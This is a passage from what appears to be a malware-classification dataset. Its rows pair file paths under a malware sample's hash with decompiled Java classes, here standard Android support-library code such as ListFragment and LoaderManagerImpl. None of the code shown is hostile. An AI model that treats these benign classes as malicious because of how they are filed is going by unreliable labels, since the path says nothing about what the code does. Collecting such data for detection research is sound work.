PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling activity"",e);       return null;     }   }   public Drawable getCallingApplicationIcon(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationIcon(this.mCallingPackage);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling application"",e);       return null;     }   }   public CharSequence getCallingApplicationLabel(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve label for calling application"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\ListFragment.code","public class ListFragment extends Fragment {   static final int INTERNAL_EMPTY_ID=16711681;   static final int INTERNAL_LIST_CONTAINER_ID=16711683;   static final int INTERNAL_PROGRESS_CONTAINER_ID=16711682;   ListAdapter mAdapter;   CharSequence mEmptyText;   View mEmptyView;   ListView mList;   View mListContainer;   boolean mListShown;   View mProgressContainer;   TextView mStandardEmptyView;   private final Handler mHandler=new Handler();   private final Runnable mRequestFocus=new Runnable(){     @Override public void run(){       ListFragment.this.mList.focusableViewAvailable(ListFragment.this.mList);     }   } ;   private final AdapterView.OnItemClickListener mOnClickListener=new AdapterView.OnItemClickListener(){     @Override public void onItemClick(    AdapterView<?> parent,    View v,    int position,    long id){       ListFragment.this.onListItemClick((ListView)parent,v,position,id);     }   } ;   @Override public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     Context context=getActivity();     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout pframe=new LinearLayout(context);     pframe.setId(INTERNAL_PROGRESS_CONTAINER_ID);     pframe.setOrientation(1);     pframe.setVisibility(8);     pframe.setGravity(17);     ProgressBar progress=new ProgressBar(context,null,R.attr.progressBarStyleLarge);     pframe.addView(progress,new FrameLayout.LayoutParams(-2,-2));     frameLayout.addView(pframe,new FrameLayout.LayoutParams(-1,-1));     FrameLayout lframe=new FrameLayout(context);     lframe.setId(INTERNAL_LIST_CONTAINER_ID);     TextView tv=new TextView(getActivity());     tv.setId(INTERNAL_EMPTY_ID);     tv.setGravity(17);     lframe.addView(tv,new FrameLayout.LayoutParams(-1,-1));     ListView lv=new ListView(getActivity());     lv.setId(R.id.list);     lv.setDrawSelectorOnTop(false);     lframe.addView(lv,new FrameLayout.LayoutParams(-1,-1));     frameLayout.addView(lframe,new FrameLayout.LayoutParams(-1,-1));     frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     return frameLayout;   }   @Override public void onViewCreated(  View view,  Bundle savedInstanceState){     super.onViewCreated(view,savedInstanceState);     ensureList();   }   @Override public void onDestroyView(){     this.mHandler.removeCallbacks(this.mRequestFocus);     this.mList=null;     this.mListShown=false;     this.mListContainer=null;     this.mProgressContainer=null;     this.mEmptyView=null;     this.mStandardEmptyView=null;     super.onDestroyView();   }   public void onListItemClick(  ListView l,  View v,  int position,  long id){   }   public void setListAdapter(  ListAdapter adapter){     boolean hadAdapter=this.mAdapter != null;     this.mAdapter=adapter;     if (this.mList != null) {       this.mList.setAdapter(adapter);       if (!this.mListShown && !hadAdapter) {         setListShown(true,getView().getWindowToken() != null);       }     }   }   public void setSelection(  int position){     ensureList();     this.mList.setSelection(position);   }   public int getSelectedItemPosition(){     ensureList();     return this.mList.getSelectedItemPosition();   }   public long getSelectedItemId(){     ensureList();     return this.mList.getSelectedItemId();   }   public ListView getListView(){     ensureList();     return this.mList;   }   public void setEmptyText(  CharSequence text){     ensureList();     if (this.mStandardEmptyView == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     this.mStandardEmptyView.setText(text);     if (this.mEmptyText == null) {       this.mList.setEmptyView(this.mStandardEmptyView);     }     this.mEmptyText=text;   }   public void setListShown(  boolean shown){     setListShown(shown,true);   }   public void setListShownNoAnimation(  boolean shown){     setListShown(shown,false);   }   private void setListShown(  boolean shown,  boolean animate){     ensureList();     if (this.mProgressContainer == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     if (this.mListShown != shown) {       this.mListShown=shown;       if (shown) {         if (animate) {           this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));           this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         }  else {           this.mProgressContainer.clearAnimation();           this.mListContainer.clearAnimation();         }         this.mProgressContainer.setVisibility(8);         this.mListContainer.setVisibility(0);         return;       }       if (animate) {         this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));       }  else {         this.mProgressContainer.clearAnimation();         this.mListContainer.clearAnimation();       }       this.mProgressContainer.setVisibility(0);       this.mListContainer.setVisibility(8);     }   }   public ListAdapter getListAdapter(){     return this.mAdapter;   }   private void ensureList(){     if (this.mList == null) {       View root=getView();       if (root == null) {         throw new IllegalStateException(""Content view not yet created"");       }       if (root instanceof ListView) {         this.mList=(ListView)root;       }  else {         this.mStandardEmptyView=(TextView)root.findViewById(INTERNAL_EMPTY_ID);         if (this.mStandardEmptyView == null) {           this.mEmptyView=root.findViewById(R.id.empty);         }  else {           this.mStandardEmptyView.setVisibility(8);         }         this.mProgressContainer=root.findViewById(INTERNAL_PROGRESS_CONTAINER_ID);         this.mListContainer=root.findViewById(INTERNAL_LIST_CONTAINER_ID);         View rawListView=root.findViewById(R.id.list);         if (!(rawListView instanceof ListView)) {           if (rawListView == null) {             throw new RuntimeException(""Your content must have a ListView whose id attribute is 'android.R.id.list'"");           }           throw new RuntimeException(""Content has view with id attribute 'android.R.id.list' that is not a ListView class"");         }         this.mList=(ListView)rawListView;         if (this.mEmptyView != null) {           this.mList.setEmptyView(this.mEmptyView);         }  else         if (this.mEmptyText != null) {           this.mStandardEmptyView.setText(this.mEmptyText);           this.mList.setEmptyView(this.mStandardEmptyView);         }       }       this.mListShown=true;       this.mList.setOnItemClickListener(this.mOnClickListener);       if (this.mAdapter != null) {         ListAdapter adapter=this.mAdapter;         this.mAdapter=null;         setListAdapter(adapter);       }  else       if (this.mProgressContainer != null) {         setListShown(false,false);       }       this.mHandler.post(this.mRequestFocus);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\LoaderCallbacks.code","public interface LoaderCallbacks<D> {   Loader<D> onCreateLoader(  int i,  Bundle bundle);   void onLoadFinished(  Loader<D> loader,  D d);   void onLoaderReset(  Loader<D> loader); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\LoaderInfo.code","public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {   final Bundle mArgs;   LoaderManager.LoaderCallbacks<Object> mCallbacks;   Object mData;   boolean mDeliveredData;   boolean mDestroyed;   boolean mHaveData;   final int mId;   boolean mListenerRegistered;   Loader<Object> mLoader;   LoaderInfo mPendingLoader;   boolean mReportNextStart;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   public LoaderInfo(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callbacks){     this.mId=id;     this.mArgs=args;     this.mCallbacks=callbacks;   }   void start(){     if (this.mRetaining && this.mRetainingStarted) {       this.mStarted=true;       return;     }     if (!this.mStarted) {       this.mStarted=true;       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);       }       if (this.mLoader == null && this.mCallbacks != null) {         this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);       }       if (this.mLoader != null) {         if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {           throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);         }         if (!this.mListenerRegistered) {           this.mLoader.registerListener(this.mId,this);           this.mListenerRegistered=true;         }         this.mLoader.startLoading();       }     }   }   void retain(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);     }     this.mRetaining=true;     this.mRetainingStarted=this.mStarted;     this.mStarted=false;     this.mCallbacks=null;   }   void finishRetain(){     if (this.mRetaining) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);       }       this.mRetaining=false;       if (this.mStarted != this.mRetainingStarted && !this.mStarted) {         stop();       }     }     if (this.mStarted && this.mHaveData && !this.mReportNextStart) {       callOnLoadFinished(this.mLoader,this.mData);     }   }   void reportStart(){     if (this.mStarted && this.mReportNextStart) {       this.mReportNextStart=false;       if (this.mHaveData) {         callOnLoadFinished(this.mLoader,this.mData);       }     }   }   void stop(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);     }     this.mStarted=false;     if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {       this.mListenerRegistered=false;       this.mLoader.unregisterListener(this);       this.mLoader.stopLoading();     }   }   void destroy(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);     }     this.mDestroyed=true;     boolean needReset=this.mDeliveredData;     this.mDeliveredData=false;     if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);       }       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";       }       try {         this.mCallbacks.onLoaderReset(this.mLoader);       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }     this.mCallbacks=null;     this.mData=null;     this.mHaveData=false;     if (this.mLoader != null) {       if (this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);       }       this.mLoader.reset();     }     if (this.mPendingLoader != null) {       this.mPendingLoader.destroy();     }   }   @Override public void onLoadComplete(  Loader<Object> loader,  Object data){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);     }     if (this.mDestroyed) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");         return;       }       return;     }     if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");         return;       }       return;     }     LoaderInfo pending=this.mPendingLoader;     if (pending != null) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);       }       this.mPendingLoader=null;       LoaderManagerImpl.this.mLoaders.put(this.mId,null);       destroy();       LoaderManagerImpl.this.installLoader(pending);       return;     }     if (this.mData != data || !this.mHaveData) {       this.mData=data;       this.mHaveData=true;       if (this.mStarted) {         callOnLoadFinished(loader,data);       }     }     LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);     if (info != null && info != this) {       info.mDeliveredData=false;       info.destroy();       LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);     }     if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {       LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();     }   }   void callOnLoadFinished(  Loader<Object> loader,  Object data){     if (this.mCallbacks != null) {       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";       }       try {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));         }         this.mCallbacks.onLoadFinished(loader,data);         this.mDeliveredData=true;       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     sb.append(""LoaderInfo{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" #"");     sb.append(this.mId);     sb.append("" : "");     DebugUtils.buildShortClassTag(this.mLoader,sb);     sb.append(""}}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mArgs="");     writer.println(this.mArgs);     writer.print(prefix);     writer.print(""mCallbacks="");     writer.println(this.mCallbacks);     writer.print(prefix);     writer.print(""mLoader="");     writer.println(this.mLoader);     if (this.mLoader != null) {       this.mLoader.dump(prefix + ""  "",fd,writer,args);     }     if (this.mHaveData || this.mDeliveredData) {       writer.print(prefix);       writer.print(""mHaveData="");       writer.print(this.mHaveData);       writer.print(""  mDeliveredData="");       writer.println(this.mDeliveredData);       writer.print(prefix);       writer.print(""mData="");       writer.println(this.mData);     }     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mReportNextStart="");     writer.print(this.mReportNextStart);     writer.print("" mDestroyed="");     writer.println(this.mDestroyed);     writer.print(prefix);     writer.print(""mRetaining="");     writer.print(this.mRetaining);     writer.print("" mRetainingStarted="");     writer.print(this.mRetainingStarted);     writer.print("" mListenerRegistered="");     writer.println(this.mListenerRegistered);     if (this.mPendingLoader != null) {       writer.print(prefix);       writer.println(""Pending Loader "");       writer.print(this.mPendingLoader);       writer.println("":"");       this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\LoaderManager.code","public abstract class LoaderManager { public interface LoaderCallbacks<D> {     Loader<D> onCreateLoader(    int i,    Bundle bundle);     void onLoadFinished(    Loader<D> loader,    D d);     void onLoaderReset(    Loader<D> loader);   }   public abstract void destroyLoader(  int i);   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract <D>Loader<D> getLoader(  int i);   public abstract <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public abstract <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public static void enableDebugLogging(  boolean enabled){     LoaderManagerImpl.DEBUG=enabled;   }   public boolean hasRunningLoaders(){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\LoaderManagerImpl.code","public class LoaderManagerImpl extends LoaderManager {   static boolean DEBUG=false;   static final String TAG=""LoaderManager"";   FragmentActivity mActivity;   boolean mCreatingLoader;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   final String mWho;   final SparseArrayCompat<LoaderInfo> mLoaders=new SparseArrayCompat<>();   final SparseArrayCompat<LoaderInfo> mInactiveLoaders=new SparseArrayCompat<>(); public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {     final Bundle mArgs;     LoaderManager.LoaderCallbacks<Object> mCallbacks;     Object mData;     boolean mDeliveredData;     boolean mDestroyed;     boolean mHaveData;     final int mId;     boolean mListenerRegistered;     Loader<Object> mLoader;     LoaderInfo mPendingLoader;     boolean mReportNextStart;     boolean mRetaining;     boolean mRetainingStarted;     boolean mStarted;     public LoaderInfo(    int id,    Bundle args,    LoaderManager.LoaderCallbacks<Object> callbacks){       this.mId=id;       this.mArgs=args;       this.mCallbacks=callbacks;     }     void start(){       if (this.mRetaining && this.mRetainingStarted) {         this.mStarted=true;         return;       }       if (!this.mStarted) {         this.mStarted=true;         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);         }         if (this.mLoader == null && this.mCallbacks != null) {           this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);         }         if (this.mLoader != null) {           if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {             throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);           }           if (!this.mListenerRegistered) {             this.mLoader.registerListener(this.mId,this);             this.mListenerRegistered=true;           }           this.mLoader.startLoading();         }       }     }     void retain(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);       }       this.mRetaining=true;       this.mRetainingStarted=this.mStarted;       this.mStarted=false;       this.mCallbacks=null;     }     void finishRetain(){       if (this.mRetaining) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);         }         this.mRetaining=false;         if (this.mStarted != this.mRetainingStarted && !this.mStarted) {           stop();         }       }       if (this.mStarted && this.mHaveData && !this.mReportNextStart) {         callOnLoadFinished(this.mLoader,this.mData);       }     }     void reportStart(){       if (this.mStarted && this.mReportNextStart) {         this.mReportNextStart=false;         if (this.mHaveData) {           callOnLoadFinished(this.mLoader,this.mData);         }       }     }     void stop(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);       }       this.mStarted=false;       if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);         this.mLoader.stopLoading();       }     }     void destroy(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);       }       this.mDestroyed=true;       boolean needReset=this.mDeliveredData;       this.mDeliveredData=false;       if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);         }         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";         }         try {           this.mCallbacks.onLoaderReset(this.mLoader);         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }       this.mCallbacks=null;       this.mData=null;       this.mHaveData=false;       if (this.mLoader != null) {         if (this.mListenerRegistered) {           this.mListenerRegistered=false;           this.mLoader.unregisterListener(this);         }         this.mLoader.reset();       }       if (this.mPendingLoader != null) {         this.mPendingLoader.destroy();       }     }     @Override public void onLoadComplete(    Loader<Object> loader,    Object data){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);       }       if (this.mDestroyed) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");           return;         }         return;       }       if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");           return;         }         return;       }       LoaderInfo pending=this.mPendingLoader;       if (pending != null) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);         }         this.mPendingLoader=null;         LoaderManagerImpl.this.mLoaders.put(this.mId,null);         destroy();         LoaderManagerImpl.this.installLoader(pending);         return;       }       if (this.mData != data || !this.mHaveData) {         this.mData=data;         this.mHaveData=true;         if (this.mStarted) {           callOnLoadFinished(loader,data);         }       }       LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);       if (info != null && info != this) {         info.mDeliveredData=false;         info.destroy();         LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);       }       if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {         LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();       }     }     void callOnLoadFinished(    Loader<Object> loader,    Object data){       if (this.mCallbacks != null) {         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";         }         try {           if (LoaderManagerImpl.DEBUG) {             Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));           }           this.mCallbacks.onLoadFinished(loader,data);           this.mDeliveredData=true;         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }     }     public String toString(){       StringBuilder sb=new StringBuilder(64);       sb.append(""LoaderInfo{"");       sb.append(Integer.toHexString(System.identityHashCode(this)));       sb.append("" #"");       sb.append(this.mId);       sb.append("" : "");       DebugUtils.buildShortClassTag(this.mLoader,sb);       sb.append(""}}"");       return sb.toString();     }     public void dump(    String prefix,    FileDescriptor fd,    PrintWriter writer,    String[] args){       writer.print(prefix);       writer.print(""mId="");       writer.print(this.mId);       writer.print("" mArgs="");       writer.println(this.mArgs);       writer.print(prefix);       writer.print(""mCallbacks="");       writer.println(this.mCallbacks);       writer.print(prefix);       writer.print(""mLoader="");       writer.println(this.mLoader);       if (this.mLoader != null) {         this.mLoader.dump(prefix + ""  "",fd,writer,args);       }       if (this.mHaveData || this.mDeliveredData) {         writer.print(prefix);         writer.print(""mHaveData="");         writer.print(this.mHaveData);         writer.print(""  mDeliveredData="");         writer.println(this.mDeliveredData);         writer.print(prefix);         writer.print(""mData="");         writer.println(this.mData);       }       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mReportNextStart="");       writer.print(this.mReportNextStart);       writer.print("" mDestroyed="");       writer.println(this.mDestroyed);       writer.print(prefix);       writer.print(""mRetaining="");       writer.print(this.mRetaining);       writer.print("" mRetainingStarted="");       writer.print(this.mRetainingStarted);       writer.print("" mListenerRegistered="");       writer.println(this.mListenerRegistered);       if (this.mPendingLoader != null) {         writer.print(prefix);         writer.println(""Pending Loader "");         writer.print(this.mPendingLoader);         writer.println("":"");         this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);       }     }   }   public LoaderManagerImpl(  String who,  FragmentActivity activity,  boolean started){     this.mWho=who;     this.mActivity=activity;     this.mStarted=started;   }   public void updateActivity(  FragmentActivity activity){     this.mActivity=activity;   }   private LoaderInfo createLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     LoaderInfo info=new LoaderInfo(id,args,callback);     Loader<Object> loader=callback.onCreateLoader(id,args);     info.mLoader=loader;     return info;   }   private LoaderInfo createAndInstallLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     try {       this.mCreatingLoader=true;       LoaderInfo info=createLoader(id,args,callback);       installLoader(info);       return info;     }   finally {       this.mCreatingLoader=false;     }   }   void installLoader(  LoaderInfo info){     this.mLoaders.put(info.mId,info);     if (this.mStarted) {       info.start();     }   }   @Override public <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""initLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo == null) {       loaderInfo=createAndInstallLoader(i,bundle,loaderCallbacks);       if (DEBUG) {         Log.v(TAG,""  Created new loader "" + loaderInfo);       }     }  else {       if (DEBUG) {         Log.v(TAG,""  Re-using existing loader "" + loaderInfo);       }       loaderInfo.mCallbacks=loaderCallbacks;     }     if (loaderInfo.mHaveData && this.mStarted) {       loaderInfo.callOnLoadFinished(loaderInfo.mLoader,loaderInfo.mData);     }     return (Loader<D>)loaderInfo.mLoader;   }   @Override public <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""restartLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo != null) {       LoaderInfo loaderInfo2=this.mInactiveLoaders.get(i);       if (loaderInfo2 != null) {         if (loaderInfo.mHaveData) {           if (DEBUG) {             Log.v(TAG,""  Removing last inactive loader: "" + loaderInfo);           }           loaderInfo2.mDeliveredData=false;           loaderInfo2.destroy();           loaderInfo.mLoader.abandon();           this.mInactiveLoaders.put(i,loaderInfo);         }  else         if (!loaderInfo.mStarted) {           if (DEBUG) {             Log.v(TAG,""  Current loader is stopped; replacing"");           }           this.mLoaders.put(i,null);           loaderInfo.destroy();         }  else {           if (loaderInfo.mPendingLoader != null) {             if (DEBUG) {               Log.v(TAG,""  Removing pending loader: "" + loaderInfo.mPendingLoader);             }             loaderInfo.mPendingLoader.destroy();             loaderInfo.mPendingLoader=null;           }           if (DEBUG) {             Log.v(TAG,""  Enqueuing as new pending loader"");           }           loaderInfo.mPendingLoader=createLoader(i,bundle,loaderCallbacks);           return (Loader<D>)loaderInfo.mPendingLoader.mLoader;         }       }  else {         if (DEBUG) {           Log.v(TAG,""  Making last loader inactive: "" + loaderInfo);         }         loaderInfo.mLoader.abandon();         this.mInactiveLoaders.put(i,loaderInfo);       }     }     return (Loader<D>)createAndInstallLoader(i,bundle,loaderCallbacks).mLoader;   }   @Override public void destroyLoader(  int id){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     if (DEBUG) {       Log.v(TAG,""destroyLoader in "" + this + "" of ""+ id);     }     int idx=this.mLoaders.indexOfKey(id);     if (idx >= 0) {       LoaderInfo info=this.mLoaders.valueAt(idx);       this.mLoaders.removeAt(idx);       info.destroy();     }     int idx2=this.mInactiveLoaders.indexOfKey(id);     if (idx2 >= 0) {       LoaderInfo info2=this.mInactiveLoaders.valueAt(idx2);       this.mInactiveLoaders.removeAt(idx2);       info2.destroy();     }     if (this.mActivity != null && !hasRunningLoaders()) {       this.mActivity.mFragments.startPendingDeferredFragments();     }   }   @Override public <D>Loader<D> getLoader(  int i){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (loaderInfo != null) {       if (loaderInfo.mPendingLoader != null) {         return (Loader<D>)loaderInfo.mPendingLoader.mLoader;       }       return (Loader<D>)loaderInfo.mLoader;     }     return null;   }   public void doStart(){     if (DEBUG) {       Log.v(TAG,""Starting in "" + this);     }     if (this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStart when already started: "" + this,e);     }  else {       this.mStarted=true;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).start();       }     }   }   public void doStop(){     if (DEBUG) {       Log.v(TAG,""Stopping in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStop when not started: "" + this,e);     }  else {       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).stop();       }       this.mStarted=false;     }   }   public void doRetain(){     if (DEBUG) {       Log.v(TAG,""Retaining in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doRetain when not started: "" + this,e);     }  else {       this.mRetaining=true;       this.mStarted=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).retain();       }     }   }   public void finishRetain(){     if (this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Finished Retaining in "" + this);       }       this.mRetaining=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).finishRetain();       }     }   }   public void doReportNextStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).mReportNextStart=true;     }   }   public void doReportStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).reportStart();     }   }   public void doDestroy(){     if (!this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Destroying Active in "" + this);       }       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).destroy();       }       this.mLoaders.clear();     }     if (DEBUG) {       Log.v(TAG,""Destroying Inactive in "" + this);     }     for (int i2=this.mInactiveLoaders.size() - 1; i2 >= 0; i2--) {       this.mInactiveLoaders.valueAt(i2).destroy();     }     this.mInactiveLoaders.clear();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     sb.append(""LoaderManager{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" in "");     DebugUtils.buildShortClassTag(this.mActivity,sb);     sb.append(""}}"");     return sb.toString();   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     if (this.mLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Active Loaders:"");       String innerPrefix=prefix + ""    "";       for (int i=0; i < this.mLoaders.size(); i++) {         